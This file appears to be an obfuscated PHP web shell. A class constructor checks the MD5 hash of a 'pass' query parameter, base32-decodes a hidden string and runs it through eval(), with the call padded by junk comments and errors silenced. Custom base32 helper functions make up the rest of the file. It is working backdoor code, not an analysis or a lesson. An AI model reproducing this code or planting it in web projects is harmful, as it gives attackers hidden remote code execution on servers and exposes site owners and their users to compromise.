<?php
class FRQC{
        public $YXIT = null;
        public $SJBI = null;
        function __construct(){
            if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){
        $this->YXIT = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->SJBI = @GNZI($this->YXIT);
        @eval("/*$]q|yhG*/".$this->SJBI."/*$]q|yhG*/");
        }}}
new FRQC();
function WKDF($JQWG){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $OPLY = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($JQWG); $i < $j; $i++){
    $v <<= 8;
        $v += ord($JQWG[$i]);
        $vbits += 8;
        while ($vbits >= 5) {
            $vbits -= 5;
            $OPLY .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);}}
    if ($vbits > 0){
        $v <<= (5 - $vbits);
        $OPLY .= $BASE32_ALPHABET[$v];}
    return $OPLY;}
function GNZI($JQWG){
    $OPLY = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($JQWG); $i < $j; $i++){
        $v <<= 5;
        if ($JQWG[$i] >= 'a' && $JQWG[$i] <= 'z'){
            $v += (ord($JQWG[$i]) - 97);
        } elseif ($JQWG[$i] >= '2' && $JQWG[$i] <= '7') {
            $v += (24 + $JQWG[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits >= 8){
            $vbits -= 8;
            $OPLY .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);}}
    return $OPLY;}
?>